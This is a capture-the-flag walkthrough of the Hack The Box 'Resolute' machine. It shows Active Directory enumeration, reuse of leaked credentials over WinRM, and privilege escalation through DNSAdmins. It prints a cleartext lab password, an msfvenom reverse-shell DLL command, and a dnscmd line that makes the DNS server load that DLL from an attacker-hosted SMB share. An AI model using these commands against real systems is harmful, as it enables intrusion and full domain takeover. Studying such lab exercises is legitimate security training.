# 📦 Resolute

<figure><img src="../../../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

Ok i start off by scanning for open ports and i found domain megacorp.local

then i try user enumeration via netexec --users flag and find plenty of users and a password in the description:

```
nxc smb 10.129.59.106 -u '' -p '' --users > preusers.txt
```

<figure><img src="../../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

Not the cleanest ouput but hey:

```
grep '^SMB' preusers.txt | grep -oP '^\S+\s+\S+\s+\S+\s+\S+\s+\K\S+'
```

Then i look at the SMB shares that i can access:

<figure><img src="../../../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>

Nothing in netlogon but a folder in sysvol so i go and dl everything and look at the content but find nothing, then i try out some other stuff but don't manage to get anything, so i try to see if the creds work with winrm, it does so i connect:

<figure><img src="../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

After enumerating and running winpeas i did not find anything so i started to look for hidden files:

```sh
*Evil-WinRM* PS C:\> gci -Hidden
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        2/20/2025   2:56 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
...
```

and in C:\PSTranscripts\20191203 i found a log file with cleartext credentials for ryan so i login with ryan

```
evil-winrm -i 10.129.59.106 -u ryan -p 'Serv3r4Admin4cc123!'
```

and i find a note in his desktop:

<figure><img src="../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

After enumerating for a bit we see that the user is part of DNSadmins:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

We can then find this article:

{% embed url="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2" %}

So i create my malicious DLL with msfvenom ->

```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.43.100 LPORT=4444 -f dll > privesc.dll
```

then i launched a smbserver with a share where i host my dll:

```
smbserver.py myshare ./
```

use dnscmd and the command **modifies the DNS server configuration** to load `privesc.dll` as a server-level plugin and since the DLL is hosted on an attacker's SMB share (`10.10.14.173`), the **DNS server will attempt to fetch and execute it**.

```
dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.14.173\myshare\privesc.dll
```

start and stop the dns service after setting up a listener and wait for my admin shell:

<figure><img src="../../../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>
